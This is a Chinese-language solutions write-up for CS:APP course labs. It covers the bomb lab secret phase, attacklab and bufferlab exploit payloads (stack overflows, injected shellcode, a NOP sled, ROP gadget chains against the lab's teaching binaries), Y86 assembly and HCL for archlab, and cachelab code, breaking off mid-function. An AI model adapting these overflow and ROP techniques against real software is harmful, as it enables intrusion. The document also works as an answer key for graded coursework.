  40126e:	bf f0 30 60 00       	mov    $0x6030f0,%edi      edi=0x6030f0
  401273:	e8 8c ff ff ff       	callq  401204 <fun7>
  401278:	83 f8 02             	cmp    $0x2,%eax           返回值必为2
  40127b:	74 05                	je     401282 <secret_phase+0x40>
  40127d:	e8 b8 01 00 00       	callq  40143a <explode_bomb>
  401282:	bf 38 24 40 00       	mov    $0x402438,%edi
  401287:	e8 84 f8 ff ff       	callq  400b10 <puts@plt>
  40128c:	e8 33 03 00 00       	callq  4015c4 <phase_defused>
  401291:	5b                   	pop    %rbx
  401292:	c3                   	retq   
```
fun7函数如下
```c
rdi为0x0630f0 rax为strtol的返回值-1 esi=rax
0000000000401204 <fun7>:
  401204:	48 83 ec 08          	sub    $0x8,%rsp
  401208:	48 85 ff             	test   %rdi,%rdi
  40120b:	74 2b                	je     401238 <fun7+0x34>
  40120d:	8b 17                	mov    (%rdi),%edx     edx=rdi=0x6030f0
  40120f:	39 f2                	cmp    %esi,%edx       
  401211:	7e 0d                	jle    401220 <fun7+0x1c>  esi>=edx跳
  401213:	48 8b 7f 08          	mov    0x8(%rdi),%rdi      rdi=rdi+0x8=0x6030f8
  401217:	e8 e8 ff ff ff       	callq  401204 <fun7>  	   
  40121c:	01 c0                	add    %eax,%eax           eax*=2
  40121e:	eb 1d                	jmp    40123d <fun7+0x39>
  401220:	b8 00 00 00 00       	mov    $0x0,%eax           eax=0
  401225:	39 f2                	cmp    %esi,%edx           
  401227:	74 14                	je     40123d <fun7+0x39>  edx==esi跳
  401229:	48 8b 7f 10          	mov    0x10(%rdi),%rdi
  40122d:	e8 d2 ff ff ff       	callq  401204 <fun7>
  401232:	8d 44 00 01          	lea    0x1(%rax,%rax,1),%eax eax=rax+rax*1+1
  401236:	eb 05                	jmp    40123d <fun7+0x39>
  401238:	b8 ff ff ff ff       	mov    $0xffffffff,%eax eax=0xffffffff
  40123d:	48 83 c4 08          	add    $0x8,%rsp
  401241:	c3                   	retq   
```
fun4的返回值必须为2，往前面推就可以了，这个是一个递归，对应的二叉树
									0x24
				0x8 								 0x32
	  0x6    		    0x16                0x2d 			  0x6b
就画到这里吧，最后的值为0x16,因为返回值必为2，则值必须小于0x16,此时与0x8比较，这里必须大于因为这里要返回1，
0x16就出来了

## lab3-attacklab ##

### 和实验内容相关的指令 ###
1.sudo gcc -c asm.s(asm.s中存放汇编代码)
2.objdump -d + 文件名(可以查看上一步中生成的机器码，或者查看题目文件的汇编代码)
3.cat cookie.txt | ./hex2raw | ./rtarget(用于确认答案)

### level1 ###
要求:getbuf返回到touch1
先反汇编getbug，如下
```python
00000000004017a8 <getbuf>:
  4017a8:	48 83 ec 28          	sub    $0x28,%rsp
  4017ac:	48 89 e7             	mov    %rsp,%rdi
  4017af:	e8 8c 02 00 00       	callq  401a40 <Gets>
  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax
  4017b9:	48 83 c4 28          	add    $0x28,%rsp
  4017bd:	c3                   	retq   
  4017be:	90                   	nop
  4017bf:	90                   	nop
```
这不就是"a"* 0x28+ad_touch1,touch1地址为0x4017c0
payload如下
```python
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 c0 17 40 00 00 00 00 00
```

### level2 ###
要求:ret touch2时，touch2的参数需要为cookie(一开始以为栈的地址是随机的，没想到是固定的，而且可写可读)
rsp_ad=0x5561dc78,cookie=0x59b997fa，touch2_ad=0x4017ec
mov %0x59b997fa,%rdi的机器码为bf fa 97 b9 59，ret的机器码为c3
payload如下
```python
BF FA 97 B9 59 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 EC 17 40 00 00 00 00 00
```
一开始mov $0x59b997f，%rdi,没加$，导致反汇编的机器码一直是错的......

### level3 ###
要求:ret touch3时，touch3的参数需要指向cookie
cookie=0x59b997fa,ad->cookie=0x5561dc7e,touch3=0x4018fa
payload
```python
bf b0 dc 61 55 c3 fa 97 b9 59 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 dc 61 55 00 00 00 00 fa 18 40 00 00 00 00 00 35 39 62 39
39 37 66 61 00 00 00 00
```
没看懂这个题目的要求，我以为那个cookie为0x59b997fa，16进制填fa 97...就可以了，结果是每一位都要用ascii的形式表达
，然后注意字符串的位置要在ret 后面

### level4 ###
要求:实现level2通过他给的gadgets
rtarget用objdump反汇编出来看不到gadgets就离谱，于是我默默的输入了ROPgadget，
pop_rdi=0x40141b,cookie=0x59b997fa,touch2_ad=0x4017ec
payload
```python
BF 7E DC 61 55 C3 35 39 62 39 39 37 66 61 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 1B 14 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 EC 17 40 00 00 00 00 00
```

### level5 ###
要求:实现level3，栈地址开了随机化，这就有点东西了，
gets_ad=0x401b60,ad=0x00605000，touch3_ad=0x4018fa
pop_rdi=0x000000000040141b,pop_rsi=0x0000000000401383，
思路:还是和level3一样，问题是怎么得到栈的地址,我一开始想的是通过mov rsp,rdi；但是我反汇编出来的没有mov rsp,rdi或者其他可以利用传rsp的就很离谱(通过read将字符串读到可写段上应该也可以，只是，由于hex2raw的问题，不好控制输入)
payload
```python
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 06 1a 40 00 00 00 00 00 c5 19 40 00 00 00 00 00 ab 19 40 00 00 00 00 00 48 00 00 00 00 00 00 00 dd 19 40 00 00 00 00 00 34 1a 40 00 00 00 00 00 13 1a 40 00 00 00 00 00 d6 19 40 00 00 00 00 00 c5 19 40 00 00 00 00 00 fa 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61 00
```

## lab3.1-bufferlab ##

### level1 - smoke ###
smoke函数地址为0x80c1848,对应 48 18 0C 08
然后看getbuf函数
```c
080491f4 <getbuf>:
 80491f4:	55                   	push   %ebp
 80491f5:	89 e5                	mov    %esp,%ebp
 80491f7:	83 ec 38             	sub    $0x38,%esp
 80491fa:	8d 45 d8             	lea    -0x28(%ebp),%eax
 80491fd:	89 04 24             	mov    %eax,(%esp)
 8049200:	e8 f5 fa ff ff       	call   8048cfa <Gets>
 8049205:	b8 01 00 00 00       	mov    $0x1,%eax
 804920a:	c9                   	leave  
 804920b:	c3                   	ret    
```
smoke函数
```c
08048c18 <smoke>:
 8048c18:   55                      push   %ebp
 8048c19:   89 e5                   mov    %esp,%ebp
 8048c1b:   83 ec 18                sub    $0x18,%esp
 8048c1e:   c7 04 24 d3 a4 04 08    movl   $0x804a4d3,(%esp)
 8048c25:   e8 96 fc ff ff          call   80488c0 <puts@plt>
 8048c2a:   c7 04 24 00 00 00 00    movl   $0x0,(%esp)
 8048c31:   e8 45 07 00 00          call   804937b <validate>
 8048c36:   c7 04 24 00 00 00 00    movl   $0x0,(%esp)
 8048c3d:   e8 be fc ff ff          call   8048900 <exit@plt>
```
思路显而易见"a" * 0x28 + p32(ebp) + p32(0x80c1848)(一开始地址弄错了怎么都没出......)
最后的payload
```python
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 18 8c 04 08
```

### level2 - fizz ###
fizz函数,地址为0x08048c42 -> 42 8c 04 08
```c
08048c42 <fizz>:
 8048c42:   55                      push   %ebp
 8048c43:   89 e5                   mov    %esp,%ebp
 8048c45:   83 ec 18                sub    $0x18,%esp
 8048c48:   8b 45 08                mov    0x8(%ebp),%eax
 8048c4b:   3b 05 08 d1 04 08       cmp    0x804d108,%eax
 8048c51:   75 26                   jne    8048c79 <fizz+0x37>
 8048c53:   89 44 24 08             mov    %eax,0x8(%esp)
 8048c57:   c7 44 24 04 ee a4 04    movl   $0x804a4ee,0x4(%esp)
 8048c5e:   08 
 8048c5f:   c7 04 24 01 00 00 00    movl   $0x1,(%esp)
 8048c66:   e8 55 fd ff ff          call   80489c0 <__printf_chk@plt>
 8048c6b:   c7 04 24 01 00 00 00    movl   $0x1,(%esp)
 8048c72:   e8 04 07 00 00          call   804937b <validate>
 8048c77:   eb 18                   jmp    8048c91 <fizz+0x4f>
 8048c79:   89 44 24 08             mov    %eax,0x8(%esp)
 8048c7d:   c7 44 24 04 40 a3 04    movl   $0x804a340,0x4(%esp)
 8048c84:   08 
 8048c85:   c7 04 24 01 00 00 00    movl   $0x1,(%esp)
 8048c8c:   e8 2f fd ff ff          call   80489c0 <__printf_chk@plt>
 8048c91:   c7 04 24 00 00 00 00    movl   $0x0,(%esp)
 8048c98:   e8 63 fc ff ff          call   8048900 <exit@plt>
```
只要保证传给这个函数的参数为cookie就可以了,
payload = "a" * 0x28 + p32(ebp) + p32(ret) + p32(push) + p32(cookie) 
payload
```c
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 42 8c 04 08 00 00 00 00 b6 e9 a9 43
```

### level3 - bang ###
bang地址0x08048c9d -> 9d 8c 04 08,cookie = 0x43a9e9b6
```c
08048c9d <bang>:
 8048c9d:   55                      push   %ebp
 8048c9e:   89 e5                   mov    %esp,%ebp
 8048ca0:   83 ec 18                sub    $0x18,%esp
 8048ca3:   a1 00 d1 04 08          mov    0x804d100,%eax
 8048ca8:   3b 05 08 d1 04 08       cmp    0x804d108,%eax
 8048cae:   75 26                   jne    8048cd6 <bang+0x39>
 8048cb0:   89 44 24 08             mov    %eax,0x8(%esp)
 8048cb4:   c7 44 24 04 60 a3 04    movl   $0x804a360,0x4(%esp)
 8048cbb:   08 
 8048cbc:   c7 04 24 01 00 00 00    movl   $0x1,(%esp)
 8048cc3:   e8 f8 fc ff ff          call   80489c0 <__printf_chk@plt>
 8048cc8:   c7 04 24 02 00 00 00    movl   $0x2,(%esp)
 8048ccf:   e8 a7 06 00 00          call   804937b <validate>
 8048cd4:   eb 18                   jmp    8048cee <bang+0x51>
 8048cd6:   89 44 24 08             mov    %eax,0x8(%esp)
 8048cda:   c7 44 24 04 0c a5 04    movl   $0x804a50c,0x4(%esp)
 8048ce1:   08 
 8048ce2:   c7 04 24 01 00 00 00    movl   $0x1,(%esp)
 8048ce9:   e8 d2 fc ff ff          call   80489c0 <__printf_chk@plt>
 8048cee:   c7 04 24 00 00 00 00    movl   $0x0,(%esp)
 8048cf5:   e8 06 fc ff ff          call   8048900 <exit@plt>
```
这一关需要保证0x804d100处为cookie,所以需要得到输入字符串的地址为 0x55683bf8,然后使用shellcode
```shellcode
00000000 <.text>:
   0:   a1 08 d1 04 08          mov    0x804d108,%eax
   5:   a3 00 d1 04 08          mov    %eax,0x804d100
   a:   68 9d 8c 04 08          push   $0x8048c9d
   f:   c3                      ret
```
生成汇编命令
```c
gcc -m32 -c test.s
objdump -d test.o
```
payload
```c
a1 08 d1 04 08 a3 00 d1 04 08 68 9d 8c 04 08 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 f8 3b 68 55
```

### level4 - dynamite ###
cookie = b6 e9 a9 43,这个任务的要求是连续5次保证ebp - 0xc == cookie,有点麻烦
思路是通过覆盖ip来跳到前面的nop,然后执行shellcode控制ebp
payload(参考:https://blog.csdn.net/u012336567/article/details/51832328)
```c
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
90 90 90 90 90 90 90 90 90 a1 08 d1 04 08 8d 6c 24 28 68 3a
8e 04 08 c3 b8 32 68 55
```

## lab4-archlab ##
### 环境安装 ###
```sh
#下载archlab-handout，并在当前目录解压，然后进入目录解压sim
cd sim
sudo apt install flex
sudo apt install bison
sudo apt install tcl tcl-dev
sudo apt install tk tk-dev
cd sim
make clean; make
#至此环境就配好了
```

### part-A ###
这一部分进入misc目录进行工作，使用y86-64汇编编写sum.ys/rsum.ys/copy.ys
```c
/* linked list element */
typedef struct ELE {

	long val;
	struct ELE *next;

} *list_ptr;
/* sum_list - Sum the elements of a linked list */
	long sum_list(list_ptr ls)
	{
		long val = 0;
		while (ls) {
		val += ls->val;
		ls = ls->next;
		}
		return val;
	}

	/* rsum_list - Recursive version of sum_list */
	long rsum_list(list_ptr ls)
	{
		if (!ls)
		return 0;
		else {
			long val = ls->val;
			long rest = rsum_list(ls->next);
			return val + rest;
		}
	}

	/* copy_block - Copy src to dest and return xor checksum of src */
	long copy_block(long *src, long *dest, long len)
	{
		long result = 0;
		while (len > 0) {
			long val = *src++;
		*dest++ = val;
		result ˆ= val;
		len--;
	}
	return result;
}

```
sum.ys如下(注意在loop结尾加上判断就可以了)
```sh
#long suml_list(list_ptr ls)
#{
#	long val = 0;
#	while (ls) {
#		val += ls->val;
#		ls = ls->next;
#	}
#	return val;

	.pos 0
	irmovq stack,%rsp
	call main
	halt

# Sample linked list
	.align 8
ele1:
	.quad 0x0a
	.quad ele2
ele2:
	.quad 0xb0
	.quad ele3
ele3:
	.quad 0xc00
	.quad 0

main:
	irmovq ele1,%rdi
	call sum
	ret
sum:
	irmovq $8,%r8
	xorq %rax,%rax
	andq %rdi,%rdi
	jmp test
loop:
	mrmovq (%rdi),%r9
	addq %r9,%rax
	addq %r8,%rdi
	mrmovq (%rdi),%rdi
	andq %rdi,%rdi
test:
	jne loop
	ret

	.pos 0x200
stack:
```
rsum.ys如下(需要注意的地方是需要使用栈来保存参数)
```sh
#long rsum_list(list_ptr ls)
#{
#	if (!ls)
#		return 0;
#	else {
#		long val = ls->val;
#		long rest = rsum_lsit(ls->next);
#		return val + rest;
#	}
#}
# ls - %rdi

	.pos 0
	irmovq stack,%rsp
	call main
	halt
# Sample linked list
	.align 8
ele1:
	.quad 0x00a
	.quad ele2
ele2:
	.quad 0x0b0
	.quad ele3
ele3:
	.quad 0xc00
	.quad 0

main:
	irmovq ele1,%rdi
	call rsum_list
	ret
rsum_list:
	andq %rdi,%rdi
	je exit
	mrmovq (%rdi),%r10
	pushq %r10
	mrmovq 8(%rdi),%rdi
	call rsum_list
	popq %r10
	addq %r10,%rax	
exit:
	ret
	.pos 0x200
stack:
```
copy.ys如下
```sh
#long copy_block(long *src, long *dest, long len)
#{
#	long result = 0;
#	while (len > 0) {
#		long val = *src++;
#		*dest++ = val;
#		result ^= val;
#		len--;
#	}
#	return result;
#}
    .pos 0
    irmovq stack, %rsp
    call main        
    halt

    .align 8
src:
	.quad 0x2222333
	.quad 0x4455666
	.quad 0x7788999
	.quad 0xaabbccc
	.quad 0xddeefff
dest:
	.quad 0xaabbccc
	.quad 0xddeefff
	.quad 0x9988977
	.quad 0x1122333
	.quad 0x4455666
main:	
	irmovq src, %rdi
    	irmovq dest, %rsi
    	irmovq $5, %rdx
	call copy
	ret
copy:
	irmovq $8,%r8
	irmovq $1,%r9
	xorq %rax,%rax
	addq %rdx,%rdx
	jmp test
loop:
	mrmovq (%rdi),%r10
	addq %r8,%rdi
	rmmovq %r10,(%rsi)
	addq %r8,%rsi
	xorq %r10,%rax
	subq %r8,%rdx
test:
	jne loop
	ret

	.pos 0x200
stack:
```

### part-B ###
任务要求是扩展SEQ处理器支持iaddq，需要修改seq/seq-full.hcl文件
iaddq类似于mrmovq，原型可以看出iaddq D,rB如图
![avatar](/images/2022-05-10161409.png)
处理如下:
```sh
#取值：
	icode:ifun <-- M1[PC]
	rA:rB <- M1[PC + 1]
	valC <- M8[PC + 2]
	valP <- PC + 10
#译码:
	valB <- R[rB]
#执行:
	valE <- valB + valC
#写回:
	R[rB] <- valE
#更新PC:
	PC <- valP
```
```sh
bool instr_valid = icode in #判断是否有效，需要加上IIADDQ
	{ INOP, IHALT, IRRMOVQ, IIRMOVQ, IRMMOVQ, IMRMOVQ,
	       IOPQ, IJXX, ICALL, IRET, IPUSHQ, IPOPQ, IIADDQ }

bool need_regids = #确定icode的值是否为带有寄存器指示值字节的指令，所以这里要加上IIADDQ
		icode in { 	IRMOVQ, IOPQ, IPUSHQ,IPOPQ,
					IIRMOVQ, IRMOVQ, IMRMOVQ, IIADDQ };

#使用rB
word srcB = [
	icode in { IOPQ, IRMMOVQ, IMRMOVQ, IIADDQ  } : rB;
	icode in { IPUSHQ, IPOPQ, ICALL, IRET } : RRSP;
	1 : RNONE;  # Don't need register
];

#dstE表示写端口E的目的寄存器
word dstE = [
	icode in { IRRMOVQ } && Cnd : rB;
	icode in { IIRMOVQ, IOPQ, IIADDQ} : rB;
	icode in { IPUSHQ, IPOPQ, ICALL, IRET } : RRSP;
	1 : RNONE;  # Don't write any register
];

#后面两步是根据执行操作 valB + valC
## Select input A to ALU
word aluA = [
	icode in { IRRMOVQ, IOPQ } : valA;
	icode in { IIRMOVQ, IRMMOVQ, IMRMOVQ, IIADDQ } : valC;
	icode in { ICALL, IPUSHQ } : -8;
	icode in { IRET, IPOPQ } : 8;
	# Other instructions don't need ALU
];

## Select input B to ALU
word aluB = [
	icode in { IRMMOVQ, IMRMOVQ, IOPQ, ICALL, 
		      IPUSHQ, IRET, IPOPQ, IIADDQ } : valB;
	icode in { IRRMOVQ, IIRMOVQ } : 0;
	
];

#类似于IOPQ
bool set_cc = icode in { IOPQ, IIADDQ };
```
运行结果如图
![avatar](/images/2022-05-10191954.png)

### part-C ###
优化步骤:
	1.尽量使用iaddq
	2.循环展开
c代码如下:
```c
#include <stdio.h>

typedef word_t word_t;

word_t src[8], dst[8];

word_t ncopy(word_t *src, word_t *dst, word_t len)
{
    word_t count = 0;
    word_t val;


    while (len > 0) {

    	if(len == 1) {
			val = *src++;
			*dst++ = val;
			if (val > 0)
			    count++;
			len--;
		}
		val = *src++;
		*dst++ = val;
		if (val > 0)
		    count++;
		val = *src++;
		*dst++ = val;
		if (val > 0)
		    count++;
		len -= 2;
		
    }
    return count;
}
```
如下
```sh
ncopy:
	iaddq $0,%rdx
	jle Done
Loop:
	mrmovq (%rdi), %r10
	rmmovq %r10, (%rsi)
	andq %r10, %r10 # val <= 0?
	jle Npos # if so, goto Npos:
	iaddq $1, %rax
Npos:
	iaddq $8, %rdi
	iaddq $8, %rsi
	iaddq $-1, %rdx
	jg Loop
Done:
	ret
```
三次展开(jg> , jge >= , jle <=,  je <):
```sh
ncopy:
	andq %rdx, %rdx
	jle Done # len <= 0 -> Done rdx = 1 || rdx = 2 || rdx = 3
	iaddq $-3, %rdx # rdx -= 3
	jge L3
L0: # rdx == -1 || rdx == -2
	iaddq $2, %rdx
	jg L1 #
	mrmovq (%rdi), %r10
	rmmovq %r10, (%rsi)
	andq %r10, %r10 # val <= 0?
	jle Done
	iaddq $1, %rax
	ret
L1:
	mrmovq (%rdi), %r10
	rmmovq %r10, (%rsi)
	mrmovq $8(%rdi), %r11
	rmmovq %r11, $8(%rsi)
	andq %r10, %r10
	jle L2
	iaddq $1, %rax
L2:
	andq %r11, %r11
	jle Done
	iaddq $1, %rax
	ret

L3:
	mrmovq (%rdi), %r10
	rmmovq %r10, (%rsi)
	mrmovq $8(%rdi), %r11
	rmmovq %r11, $8(%rsi)
	mrmovq $16(%rdi), %r12
	rmmovq %r12, $16(%rsi)
	andq %r10, %r10
	jle L4
	iaddq $1, %rax
L4:
	andq %r11, %r11
	jle L5
	iaddq $1, %rax
L5:
	andq %r12, %r12
	jle L6
	iaddq $1, %rax
L6:	
	iaddq $24, %rdi
	iaddq $24, %rsi
	iaddq $0, %rdx
	jg ncopy
Done:
	ret
```
四次展开:
```sh
ncopy:
	andq %rdx, %rdx
	jle Done # len <= 0 -> Done rdx = 1 || rdx = 2 || rdx = 3
	iaddq $-4, %rdx # rdx -= 3
	jge L4
L0: # rdx == -1 || rdx == -2 || rdx == -3
	iaddq $2, %rdx
	jg L1
	iaddq $1, %rdx
	jg L22
	mrmovq (%rdi), %r10
	rmmovq %r10, (%rsi)	
	andq %r10, %r10 # val <= 0?
	jle Done
	iaddq $1, %rax
	ret
L22: #2
	mrmovq (%rdi), %r10
	rmmovq %r10, (%rsi)
	mrmovq $8(%rdi), %r11
	rmmovq %r11, $8(%rsi)
	andq %r10, %r10
	jle L23
	iaddq $1, %rax
L23:
	andq %r11, %r11
	jle Done
	iaddq $1, %rax
	ret
L1: # 3
	mrmovq (%rdi), %r10
	rmmovq %r10, (%rsi)
	mrmovq $8(%rdi), %r11
	rmmovq %r11, $8(%rsi)
	mrmovq $16(%rdi), %r12
	rmmovq %r12, $16(%rsi)
	andq %r10, %r10
	jle L2
	iaddq $1, %rax
L2:
	andq %r11, %r11
	jle L3
	iaddq $1, %rax
L3:
	andq %r12, %r12
	jle Done
	iaddq $1, %rax
	ret

L4:
	mrmovq (%rdi), %r10
	rmmovq %r10, (%rsi)
	mrmovq $8(%rdi), %r11
	rmmovq %r11, $8(%rsi)
	mrmovq $16(%rdi), %r12
	rmmovq %r12, $16(%rsi)
	mrmovq $24(%rdi), %r13
	rmmovq %r13, $24(%rsi)
	andq %r10, %r10
	jle L5
	iaddq $1, %rax
L5:
	andq %r11, %r11
	jle L6
	iaddq $1, %rax
L6:
	andq %r12, %r12
	jle L7
	iaddq $1, %rax
L7:
	andq %r13, %r13
	jle L8
	iaddq $1, %rax
L8:	
	iaddq $32, %rdi
	iaddq $32, %rsi
	iaddq $0, %rdx
	jg ncopy
Done:
	ret
```

## lab6-cachelab ##
任务要求:处理文件csim.c和tran.c
	Part(a)实现缓存模拟器W
	Part(b)编写函数计算trans.c中给定矩阵的转置
driver.py用于评估缓存的正确，以及trans.c中的转置函数相关信息
测试方法：
```sh
part-A: make && ./test-csim
part-B: make && ./driver.py
```

### 基础知识 ###
表示cache的相关量有：
  1.B(b)，b在地址中表示块的偏移，用于索引缓存中的块，B = 2^b表示每个高速缓存块的字节数
  2.S(s)，s在地址中表示组的偏移，用于索引组，S = 2^s表示组的数量
  3.t(标记)用于匹配缓存中的标记位，当标记位一致则，可以匹配到行
  4.E表示每一组中行的数量，并根据行的数量可以分为不同类型的缓存
  5.M(m)，m表示物理地址位数，M = 2^m表示内存地址的最大数量
  6.C = B x E x S表示不包括有效位和标记位这样开销的高速缓存大小
如图
![avatar](/images/2022-07-29195806.png)

### part-A ###
思路非常清晰明了
csim.c如下
```c
#include "cachelab.h"
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <limits.h>
#include <getopt.h>
#include <string.h>

int h,v,s,E,b,S;

int hit_count,
  miss_count,
    eviction_count;

char t[1000];

typedef struct
{
  int valid_bits;
  int tag;
  int stamp;
}cache_line,*cache_asso,**cache;

cache _cache_ = NULL;

void init_cache()
{
  _cache_ = (cache)malloc(sizeof(cache_asso) * S);
  for(int i = 0; i < S; ++i)
  {
    _cache_[i] = (cache_asso)malloc(sizeof(cache_line) * E);
    for(int j = 0; j < E; ++j)
    {
      _cache_[i][j].valid_bits = 0;
      _cache_[i][j].tag = -1;
      _cache_[i][j].stamp = -1;
    }
  }
}

void update(unsigned int address)
{
  int setindex_add = (address >> b) & ((-1U) >> (64 - s));
  int tag_add = address >> (b + s);
  
  int max_stamp = INT_MIN;
  int max_stamp_index = -1;

  for(int i = 0; i < E; ++i)
  {
    if(_cache_[setindex_add][i].tag == tag_add)
    {
      _cache_[setindex_add][i].stamp = 0;
      ++hit_count;
      return ;
    }
  }
  
  for(int i = 0; i < E; ++i)
  {
    if(_cache_[setindex_add][i].valid_bits == 0)
    {
      _cache_[setindex_add][i].valid_bits = 1;
      _cache_[setindex_add][i].tag = tag_add;
      _cache_[setindex_add][i].stamp = 0;
      ++miss_count;
      return ;  
    }
  }
  
  ++eviction_count;
  ++miss_count;
  
  for(int i = 0; i < E; ++i)
  {
    if(_cache_[setindex_add][i].stamp > max_stamp)
    {
      max_stamp = _cache_[setindex_add][i].stamp;
      max_stamp_index = i;  
    } 
  }
  _cache_[setindex_add][max_stamp_index].tag = tag_add;
  _cache_[setindex_add][max_stamp_index].stamp = 0;
  return ;
}

void update_stamp()
{
  for(int i = 0; i < S; ++i)
    for(int j = 0; j < E; ++j)
      if(_cache_[i][j].valid_bits == 1)
        ++_cache_[i][j].stamp;
}

void parse_trace()
{
  FILE* fp = fopen(t,"r");
  if(fp == NULL)
  {
    printf("open error");
    exit(-1);
  }
  
  char operation;
  unsigned int address;
  int size;
  while(fscanf(fp, "%c %xu,%d\n",&operation, &address, &size) > 0)
  {
    switch(operation)
    {
      case 'L':
        update(address);
        break;
      case 'M':
        update(address);
      case 'S':
        update(address);
    }
    update_stamp();
  }
  fclose(fp); 
  for(int i = 0; i < S; ++i)
    free(_cache_[i]);
  free(_cache_);
}

int main(int argc, char* argv[])
{
  h = 0;
  v = 0;
  hit_count = miss_count = eviction_count = 0;
  int opt;
  
  while(-1 != (opt = (getopt(argc,argv,"hvs:E:b:t:"))))
  {
    switch(opt)
    {
      case 's':
        s = atoi(optarg);
        break;
      case 'E':
        E = atoi(optarg);
        break;
      case 'b':
        b = atoi(optarg);
        break;
      case 't':
        strcpy(t,optarg);
        break;  
    }
  }
  if(s<=0 || E<=0 || b<=0 || t ==NULL)
    return -1;
  S = 1 << s;
  FILE* fp = fopen(t,"r");
  if(fp == NULL)
  {
    printf("open error");
  }
  
  init_cache();
  parse_trace();
  printSummary(hit_count,miss_count,eviction_count);
  return 0;
}
```

### part-B ###
需要修改trans.c的transpose_submit函数实现转置函数
检测方法：
```sh
make && ./test-trans -M 32 -N 32
make && ./test-trans -M 64 -N 64
make && ./test-trans -M 61 -N 67
```

#### 32x32 ####
思路非常清晰一次传8个，cache的参数s = 5, b = 5, E = 1.则cache的大小是32组，每组一行，一行可以放32bytes，即8个int
这样的话，在32x32的模式中，即4x8x32
```c
if(M == 32)
  {
    int i,j,k,tmp1,tmp2,tmp3,tmp4,tmp5,tmp6,tmp7,tmp8;
    for(i = 0; i < N; i+=8)
    {
      for(j = 0; j < M; j+=8)
      {
        for(k = i; k <(i+8); k++)
        {
          tmp1 = A[k][j];
          tmp2 = A[k][j+1];
          tmp3 = A[k][j+2];
          tmp4 = A[k][j+3];
          tmp5 = A[k][j+4];
          tmp6 = A[k][j+5];
          tmp7 = A[k][j+6];
          tmp8 = A[k][j+7];

          B[j][k] = tmp1;
          B[j+1][k] = tmp2;
          B[j+2][k] = tmp3;
          B[j+3][k] = tmp4;
          B[j+4][k] = tmp5;
          B[j+5][k] = tmp6;
          B[j+6][k] = tmp7;
          B[j+7][k] = tmp8;
        }     
      }   
    }
  }
```

### 64x64 ###
64x64的情况要复杂一些,有一点点抽象，cache的模式是32组，每组8个int，思路是将64分成4块(1,2,3,4)，先将1,2复制过去，然后2'复制到3',将3复制到2',最后将
4复制到4'
代码如下
```c
else if(M == 64)
  {
    int m;
    for(i = 0; i < N; i+=8)
    {
      for(j = 0; j < M; j+=8)
      {
        for(k = i; k < i + 4; ++k)
        {
          tmp1 = A[k][j];
          tmp2 = A[k][j+1];
          tmp3 = A[k][j+2];
          tmp4 = A[k][j+3];

          tmp5 = A[k][j+4];
          tmp6 = A[k][j+5];
          tmp7 = A[k][j+6];
          tmp8 = A[k][j+7]; 
  
          B[j][k] = tmp1;
          B[j+1][k] = tmp2;
          B[j+2][k] = tmp3;
          B[j+3][k] = tmp4;

          B[j][k+4] = tmp5;
          B[j+1][k+4] = tmp6;
          B[j+2][k+4] = tmp7;
          B[j+3][k+4] = tmp8;
         
        }
        for(m = j; m < j + 4; ++m)
        {
          tmp1 = A[i+4][m];
          tmp2 = A[i+5][m];
          tmp3 = A[i+6][m];
          tmp4 = A[i+7][m];
          
          tmp5 = B[m][i+4];
          tmp6 = B[m][i+5];
          tmp7 = B[m][i+6];
